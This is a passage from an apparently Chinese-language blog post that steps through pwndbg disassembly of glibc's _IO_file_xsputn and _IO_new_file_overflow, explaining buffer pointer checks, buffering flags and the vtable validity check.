sub    r8,rdx</span><br><span class="line">   0x00007ffff7c8b6fa &lt;+250&gt;:   test   r8,r8</span><br><span class="line">   0x00007ffff7c8b6fd &lt;+253&gt;:   jne    0x7ffff7c8b750 &lt;_IO_new_file_xsputn+336&gt;</span><br><span class="line">   0x00007ffff7c8b6ff &lt;+255&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b702 &lt;+258&gt;:   test   r15,r15</span><br><span class="line">   0x00007ffff7c8b705 &lt;+261&gt;:   je     0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b70b &lt;+267&gt;:   lea    rsi,[r13+r8*1+0x0]</span><br><span class="line">   0x00007ffff7c8b710 &lt;+272&gt;:   mov    rdx,r15</span><br><span class="line">   0x00007ffff7c8b713 &lt;+275&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b716 &lt;+278&gt;:   call   0x7ffff7c8ddc0 &lt;__GI__IO_default_xsputn&gt;</span><br><span class="line">   0x00007ffff7c8b71b &lt;+283&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8b71e &lt;+286&gt;:   add    r12,rax</span><br><span class="line">   0x00007ffff7c8b721 &lt;+289&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b726 &lt;+294&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b730 &lt;+304&gt;:   sub    rax,0x1</span><br><span class="line">   0x00007ffff7c8b734 &lt;+308&gt;:   cmp    BYTE PTR [rax],0xa</span><br><span class="line">   0x00007ffff7c8b737 &lt;+311&gt;:   je     0x7ffff7c8b850 &lt;_IO_new_file_xsputn+592&gt;</span><br><span class="line">   0x00007ffff7c8b73d &lt;+317&gt;:   cmp    r13,rax</span><br><span class="line">   0x00007ffff7c8b740 &lt;+320&gt;:   jb     0x7ffff7c8b730 &lt;_IO_new_file_xsputn+304&gt;</span><br><span class="line">   0x00007ffff7c8b742 &lt;+322&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b745 &lt;+325&gt;:   jmp    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">   0x00007ffff7c8b74a &lt;+330&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b750 &lt;+336&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b757 &lt;+343&gt;:   test   DWORD PTR [rbp+0x0],0x1000</span><br><span class="line">   0x00007ffff7c8b75e &lt;+350&gt;:   jne    0x7ffff7c8b870 &lt;_IO_new_file_xsputn+624&gt;</span><br><span class="line">   0x00007ffff7c8b764 &lt;+356&gt;:   mov    rdx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8b768 &lt;+360&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8b76c &lt;+364&gt;:   cmp    rdx,rsi</span><br><span class="line">   0x00007ffff7c8b76f &lt;+367&gt;:   je     0x7ffff7c8b7b1 &lt;_IO_new_file_xsputn+433&gt;</span><br><span class="line">   0x00007ffff7c8b771 &lt;+369&gt;:   mov    rcx,rax</span><br><span class="line">   0x00007ffff7c8b774 &lt;+372&gt;:   sub    rcx,r14</span><br><span class="line">   0x00007ffff7c8b777 &lt;+375&gt;:   cmp    r12,rcx</span><br><span class="line">   0x00007ffff7c8b77a &lt;+378&gt;:   jbe    0x7ffff7c8b8fd &lt;_IO_new_file_xsputn+765&gt;</span><br><span class="line">   0x00007ffff7c8b780 &lt;+384&gt;:   sub    rsi,rdx</span><br><span class="line">   0x00007ffff7c8b783 &lt;+387&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b787 &lt;+391&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8b78c &lt;+396&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b78f &lt;+399&gt;:   call   QWORD PTR [rax+0x80]</span><br><span class="line">   0x00007ffff7c8b795 &lt;+405&gt;:   cmp    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b799 &lt;+409&gt;:   je     0x7ffff7c8b8aa &lt;_IO_new_file_xsputn+682&gt;</span><br><span class="line">   0x00007ffff7c8b79f &lt;+415&gt;:   mov    QWORD PTR [rbp+0x90],rax</span><br><span class="line">   0x00007ffff7c8b7a6 &lt;+422&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b7aa &lt;+426&gt;:   mov    rax,QWORD PTR [rbp+0xd8]</span><br><span class="line">   0x00007ffff7c8b7b1 &lt;+433&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8b7b4 &lt;+436&gt;:   sub    rdx,r14</span><br><span class="line">   0x00007ffff7c8b7b7 &lt;+439&gt;:   cmp    r12,rdx</span><br><span class="line">   0x00007ffff7c8b7ba &lt;+442&gt;:   jbe    0x7ffff7c8b8e1 &lt;_IO_new_file_xsputn+737&gt;</span><br><span class="line">   0x00007ffff7c8b7c0 &lt;+448&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b7c4 &lt;+452&gt;:   mov    rdx,r8</span><br><span class="line">   0x00007ffff7c8b7c7 &lt;+455&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b7ca &lt;+458&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8b7cd &lt;+461&gt;:   call   QWORD PTR [rax+0x78]</span><br><span class="line">   0x00007ffff7c8b7d0 &lt;+464&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b7d4 &lt;+468&gt;:   mov    r14,rax</span><br><span class="line">   0x00007ffff7c8b7d7 &lt;+471&gt;:   movzx  eax,WORD PTR [rbp+0x80]</span><br><span class="line">   0x00007ffff7c8b7de &lt;+478&gt;:   test   r14,r14</span><br><span class="line">   0x00007ffff7c8b7e1 &lt;+481&gt;:   je     0x7ffff7c8b7ec &lt;_IO_new_file_xsputn+492&gt;</span><br><span class="line">   0x00007ffff7c8b7e3 &lt;+483&gt;:   test   ax,ax</span><br><span class="line">   0x00007ffff7c8b7e6 &lt;+486&gt;:   jne    0x7ffff7c8b8c0 &lt;_IO_new_file_xsputn+704&gt;</span><br><span class="line">   0x00007ffff7c8b7ec &lt;+492&gt;:   mov    rax,QWORD PTR [rbp+0x38]</span><br><span class="line">   0x00007ffff7c8b7f0 &lt;+496&gt;:   mov    edx,DWORD PTR [rbp+0xc0]</span><br><span class="line">   0x00007ffff7c8b7f6 &lt;+502&gt;:   movq   xmm0,rax</span><br><span class="line">   0x00007ffff7c8b7fb &lt;+507&gt;:   mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8b7ff &lt;+511&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8b803 &lt;+515&gt;:   movups XMMWORD PTR [rbp+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8b807 &lt;+519&gt;:   movups XMMWORD PTR [rbp+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8b80b &lt;+523&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8b80d &lt;+525&gt;:   jle    0x7ffff7c8b898 &lt;_IO_new_file_xsputn+664&gt;</span><br><span class="line">   0x00007ffff7c8b813 &lt;+531&gt;:   mov    rax,QWORD PTR [rbp+0x40]</span><br><span class="line">   0x00007ffff7c8b817 &lt;+535&gt;:   mov    QWORD PTR [rbp+0x30],rax</span><br><span class="line">   0x00007ffff7c8b81b &lt;+539&gt;:   cmp    r14,r8</span><br><span class="line">   0x00007ffff7c8b81e &lt;+542&gt;:   jb     0x7ffff7c8b8ad &lt;_IO_new_file_xsputn+685&gt;</span><br><span class="line">   0x00007ffff7c8b824 &lt;+548&gt;:   sub    r15,r14</span><br><span class="line">   0x00007ffff7c8b827 &lt;+551&gt;:   jmp    0x7ffff7c8b6ff &lt;_IO_new_file_xsputn+255&gt;</span><br><span class="line">   0x00007ffff7c8b82c &lt;+556&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b830 &lt;+560&gt;:   sub    rbx,r15</span><br><span class="line">   0x00007ffff7c8b833 &lt;+563&gt;:   mov    rax,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b83a &lt;+570&gt;:   test   r15,r15</span><br><span class="line">   0x00007ffff7c8b83d &lt;+573&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b840 &lt;+576&gt;:   cmove  r12,rax</span><br><span class="line">   0x00007ffff7c8b844 &lt;+580&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b849 &lt;+585&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8b850 &lt;+592&gt;:   sub    rax,r13</span><br><span class="line">   0x00007ffff7c8b853 &lt;+595&gt;:   add    rax,0x1</span><br><span class="line">   0x00007ffff7c8b857 &lt;+599&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c8b85a &lt;+602&gt;:   jne    0x7ffff7c8b921 &lt;_IO_new_file_xsputn+801&gt;</span><br><span class="line">   0x00007ffff7c8b860 &lt;+608&gt;:   mov    r15,rbx</span><br><span class="line">   0x00007ffff7c8b863 &lt;+611&gt;:   mov    r14d,0x1</span><br><span class="line">   0x00007ffff7c8b869 &lt;+617&gt;:   jmp    0x7ffff7c8b669 &lt;_IO_new_file_xsputn+105&gt;</span><br><span class="line">   0x00007ffff7c8b86e &lt;+622&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8b870 &lt;+624&gt;:   mov    QWORD PTR [rbp+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8b87b &lt;+635&gt;:   jmp    0x7ffff7c8b7b1 &lt;_IO_new_file_xsputn+433&gt;</span><br><span class="line">   0x00007ffff7c8b880 &lt;+640&gt;:   mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7c8b884 &lt;+644&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b889 &lt;+649&gt;:   mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b88d &lt;+653&gt;:   jmp    0x7ffff7c8b6ca &lt;_IO_new_file_xsputn+202&gt;</span><br><span class="line">   0x00007ffff7c8b892 &lt;+658&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b898 &lt;+664&gt;:   test   DWORD PTR [rbp+0x0],0x202</span><br><span class="line">   0x00007ffff7c8b89f &lt;+671&gt;:   jne    0x7ffff7c8b817 &lt;_IO_new_file_xsputn+535&gt;</span><br><span class="line">   0x00007ffff7c8b8a5 &lt;+677&gt;:   jmp    0x7ffff7c8b813 &lt;_IO_new_file_xsputn+531&gt;</span><br><span class="line">   0x00007ffff7c8b8aa &lt;+682&gt;:   xor    r14d,r14d</span><br><span class="line">   0x00007ffff7c8b8ad &lt;+685&gt;:   sub    rbx,r15</span><br><span class="line">   0x00007ffff7c8b8b0 &lt;+688&gt;:   mov    r12,rbx</span><br><span class="line">   0x00007ffff7c8b8b3 &lt;+691&gt;:   add    r12,r14</span><br><span class="line">   0x00007ffff7c8b8b6 &lt;+694&gt;:   jmp    0x7ffff7c8b66e &lt;_IO_new_file_xsputn+110&gt;</span><br><span class="line">   0x00007ffff7c8b8bb &lt;+699&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b8c0 &lt;+704&gt;:   lea    edi,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8b8c3 &lt;+707&gt;:   mov    edx,r14d</span><br><span class="line">   0x00007ffff7c8b8c6 &lt;+710&gt;:   mov    rsi,r13</span><br><span class="line">   0x00007ffff7c8b8c9 &lt;+713&gt;:   call   0x7ffff7c8e8b0 &lt;__GI__IO_adjust_column&gt;</span><br><span class="line">   0x00007ffff7c8b8ce &lt;+718&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b8d2 &lt;+722&gt;:   add    eax,0x1</span><br><span class="line">   0x00007ffff7c8b8d5 &lt;+725&gt;:   mov    WORD PTR [rbp+0x80],ax</span><br><span class="line">   0x00007ffff7c8b8dc &lt;+732&gt;:   jmp    0x7ffff7c8b7ec &lt;_IO_new_file_xsputn+492&gt;</span><br><span class="line">   0x00007ffff7c8b8e1 &lt;+737&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8b8e6 &lt;+742&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b8ea &lt;+746&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b8ef &lt;+751&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b8f4 &lt;+756&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b8f8 &lt;+760&gt;:   jmp    0x7ffff7c8b7c0 &lt;_IO_new_file_xsputn+448&gt;</span><br><span class="line">   0x00007ffff7c8b8fd &lt;+765&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8b902 &lt;+770&gt;:   mov    QWORD PTR [rsp],r8</span><br><span class="line">   0x00007ffff7c8b906 &lt;+774&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8b90b &lt;+779&gt;:   mov    rsi,QWORD PTR [rbp+0x20]</span><br><span class="line">   0x00007ffff7c8b90f &lt;+783&gt;:   mov    rdx,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c8b913 &lt;+787&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8b918 &lt;+792&gt;:   mov    r8,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7c8b91c &lt;+796&gt;:   jmp    0x7ffff7c8b780 &lt;_IO_new_file_xsputn+384&gt;</span><br><span class="line">   0x00007ffff7c8b921 &lt;+801&gt;:   mov    r14d,0x1</span><br><span class="line">   0x00007ffff7c8b927 &lt;+807&gt;:   jmp    0x7ffff7c8b64a &lt;_IO_new_file_xsputn+74&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>回到调试，还是先判断了写入字节数是否为0，为0直接返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b604 &lt;_IO_file_xsputn+4&gt;     push   r15</span><br><span class="line">0x7ffff7c8b606 &lt;_IO_file_xsputn+6&gt;     push   r14</span><br><span class="line">0x7ffff7c8b608 &lt;_IO_file_xsputn+8&gt;     push   r13</span><br><span class="line">0x7ffff7c8b60a &lt;_IO_file_xsputn+10&gt;    push   r12</span><br><span class="line">0x7ffff7c8b60c &lt;_IO_file_xsputn+12&gt;    xor    r12d, r12d     R12D =&gt; 0</span><br><span class="line">0x7ffff7c8b60f &lt;_IO_file_xsputn+15&gt;    push   rbp</span><br><span class="line">0x7ffff7c8b610 &lt;_IO_file_xsputn+16&gt;    push   rbx</span><br><span class="line">0x7ffff7c8b611 &lt;_IO_file_xsputn+17&gt;    sub    rsp, 0x18      RSP =&gt; 0x7fffffffdc40 (0x7fffffffdc58 - 0x18)</span><br><span class="line">0x7ffff7c8b615 &lt;_IO_file_xsputn+21&gt;    test   rdx, rdx       0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b618 &lt;_IO_file_xsputn+24&gt;  ✘ je     _IO_file_xsputn+110         &lt;_IO_file_xsputn+110&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8b66e &lt;+110&gt;:   add    rsp,0x18</span><br><span class="line">0x00007ffff7c8b672 &lt;+114&gt;:   mov    rax,r12</span><br><span class="line">0x00007ffff7c8b675 &lt;+117&gt;:   pop    rbx</span><br><span class="line">0x00007ffff7c8b676 &lt;+118&gt;:   pop    rbp</span><br><span class="line">0x00007ffff7c8b677 &lt;+119&gt;:   pop    r12</span><br><span class="line">0x00007ffff7c8b679 &lt;+121&gt;:   pop    r13</span><br><span class="line">0x00007ffff7c8b67b &lt;+123&gt;:   pop    r14</span><br><span class="line">0x00007ffff7c8b67d &lt;+125&gt;:   pop    r15</span><br><span class="line">0x00007ffff7c8b67f &lt;+127&gt;:   ret</span><br></pre></td></tr></table></figure><p>继续往后<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b620 &lt;_IO_file_xsputn+32&gt;     mov    rdi, qword ptr [rdi + 0x28]     RDI, [0x5555555592c8] =&gt; 0</span><br><span class="line">0x7ffff7c8b624 &lt;_IO_file_xsputn+36&gt;     mov    rbx, rdx                        RBX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b627 &lt;_IO_file_xsputn+39&gt;     mov    eax, dword ptr [rbp]            EAX, [0x5555555592a0] =&gt; 0xfbad2488</span><br><span class="line">0x7ffff7c8b62a &lt;_IO_file_xsputn+42&gt;     and    eax, 0xa00                      EAX =&gt; 0 (0xfbad2488 &amp; 0xa00)</span><br><span class="line">0x7ffff7c8b62f &lt;_IO_file_xsputn+47&gt;     cmp    eax, 0xa00                      0x0 - 0xa00     EFLAGS =&gt; 0x287 [ CF PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8b634 &lt;_IO_file_xsputn+52&gt;   ✘ je     _IO_file_xsputn+128         &lt;_IO_file_xsputn+128&gt;</span><br></pre></td></tr></table></figure><p><code>[rdi+0x28]</code>即<code>_IO_FILE_plus</code>偏移0x28处的 <code>_IO_write_ptr</code>，将其保存，然后检查 <code>_flags &amp; 0xa00 == 0xa00</code>，这是判断是否为 <code>_IO_LINE_BUF</code> 或 <code>_IO_UNBUFFERED</code>（判断缓冲模式），若是，则跳到另一分支处理，先不管，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b636 &lt;_IO_file_xsputn+54&gt;     mov    r12, qword ptr [rbp + 0x30]     R12, [0x5555555592d0] =&gt; 0</span><br><span class="line">0x7ffff7c8b63a &lt;_IO_file_xsputn+58&gt;     cmp    r12, rdi                        0 - 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b63d &lt;_IO_file_xsputn+61&gt;   ✔ jbe    _IO_file_xsputn+160         &lt;_IO_file_xsputn+160&gt;</span><br></pre></td></tr></table></figure><p>这里<code>[rbp+0x30]</code>即<code>_IO_FILE_plus</code>偏移0x30处的 <code>_IO_write_end</code>，如果<code>_IO_write_ptr</code>&gt;&#x3D; <code>_IO_write_end</code>，则写缓冲区不足，跳转<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6a0 &lt;_IO_file_xsputn+160&gt;    mov    r15, rbx                        R15 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6a3 &lt;_IO_file_xsputn+163&gt;    mov    rax, qword ptr [rbp + 0xd8]     RAX, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6aa &lt;_IO_file_xsputn+170&gt;    lea    r14, [rip + 0x18b34f]           R14 =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6b1 &lt;_IO_file_xsputn+177&gt;    lea    r12, [rip + 0x18c0b0]           R12 =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8b6b8 &lt;_IO_file_xsputn+184&gt;    sub    r12, r14                        R12 =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8b6bb &lt;_IO_file_xsputn+187&gt;    mov    rdx, rax                        RDX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8b6be &lt;_IO_file_xsputn+190&gt;    sub    rdx, r14                        RDX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8b6c1 &lt;_IO_file_xsputn+193&gt;    cmp    r12, rdx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6c4 &lt;_IO_file_xsputn+196&gt;  ✘ jbe    _IO_file_xsputn+640         &lt;_IO_file_xsputn+640&gt;</span><br><span class="line"></span><br><span class="line">0x00007ffff7c8b880 &lt;+640&gt;:   mov    QWORD PTR [rsp],rax</span><br><span class="line">0x00007ffff7c8b884 &lt;+644&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>这里是<code>vtable</code>的安全检查，不再赘述，往下继续，调用<code>vtable-&gt;_IO_file_overflow</code>函数（<code>vtable</code>偏移0x18处）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6ca &lt;_IO_file_xsputn+202&gt;    mov    esi, 0xffffffff     ESI =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8b6cf &lt;_IO_file_xsputn+207&gt;    mov    rdi, rbp            RDI =&gt; 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line">0x7ffff7c8b6d2 &lt;_IO_file_xsputn+210&gt;    call   qword ptr [rax + 0x18]      &lt;_IO_file_overflow&gt;</span><br></pre></td></tr></table></figure><p>先贴上其汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_overflow:</span><br><span class="line">=&gt; 0x00007ffff7c8cdc0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8cdc4 &lt;+4&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8cdc6 &lt;+6&gt;:     push   rbp</span><br><span class="line">   0x00007ffff7c8cdc7 &lt;+7&gt;:     mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c8cdca &lt;+10&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8cdcb &lt;+11&gt;:    mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8cdcd &lt;+13&gt;:    test   al,0x8</span><br><span class="line">   0x00007ffff7c8cdcf &lt;+15&gt;:    jne    0x7ffff7c8cfc0 &lt;_IO_new_file_overflow+512&gt;</span><br><span class="line">   0x00007ffff7c8cdd5 &lt;+21&gt;:    mov    ebx,esi</span><br><span class="line">   0x00007ffff7c8cdd7 &lt;+23&gt;:    mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8cddb &lt;+27&gt;:    test   ah,0x8</span><br><span class="line">   0x00007ffff7c8cdde &lt;+30&gt;:    je     0x7ffff7c8ce30 &lt;_IO_new_file_overflow+112&gt;</span><br><span class="line">   0x00007ffff7c8cde0 &lt;+32&gt;:    test   rsi,rsi</span><br><span class="line">   0x00007ffff7c8cde3 &lt;+35&gt;:    je     0x7ffff7c8cf58 &lt;_IO_new_file_overflow+408&gt;</span><br><span class="line">   0x00007ffff7c8cde9 &lt;+41&gt;:    mov    rdx,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007ffff7c8cded &lt;+45&gt;:    cmp    ebx,0xffffffff</span><br><span class="line">   0x00007ffff7c8cdf0 &lt;+48&gt;:    je     0x7ffff7c8ce9c &lt;_IO_new_file_overflow+220&gt;</span><br><span class="line">   0x00007ffff7c8cdf6 &lt;+54&gt;:    cmp    QWORD PTR [rbp+0x40],rdx</span><br><span class="line">   0x00007ffff7c8cdfa &lt;+58&gt;:    je     0x7ffff7c8cee0 &lt;_IO_new_file_overflow+288&gt;</span><br><span class="line">   0x00007ffff7c8ce00 &lt;+64&gt;:    lea    rax,[rdx+0x1]</span><br><span class="line">   0x00007ffff7c8ce04 &lt;+68&gt;:    mov    QWORD PTR [rbp+0x28],rax</span><br><span class="line">   0x00007ffff7c8ce08 &lt;+72&gt;:    mov    BYTE PTR [rdx],bl</span><br><span class="line">   0x00007ffff7c8ce0a &lt;+74&gt;:    mov    eax,DWORD PTR [rbp+0x0]</span><br><span class="line">   0x00007ffff7c8ce0d &lt;+77&gt;:    test   al,0x2</span><br><span class="line">   0x00007ffff7c8ce0f &lt;+79&gt;:    jne    0x7ffff7c8ceb0 &lt;_IO_new_file_overflow+240&gt;</span><br><span class="line">   0x00007ffff7c8ce15 &lt;+85&gt;:    test   ah,0x2</span><br><span class="line">   0x00007ffff7c8ce18 &lt;+88&gt;:    je     0x7ffff7c8ce23 &lt;_IO_new_file_overflow+99&gt;</span><br><span class="line">   0x00007ffff7c8ce1a &lt;+90&gt;:    cmp    ebx,0xa</span><br><span class="line">   0x00007ffff7c8ce1d &lt;+93&gt;:    je     0x7ffff7c8ceb0 &lt;_IO_new_file_overflow+240&gt;</span><br><span class="line">   0x00007ffff7c8ce23 &lt;+99&gt;:    movzx  eax,bl</span><br><span class="line">   0x00007ffff7c8ce26 &lt;+102&gt;:   pop    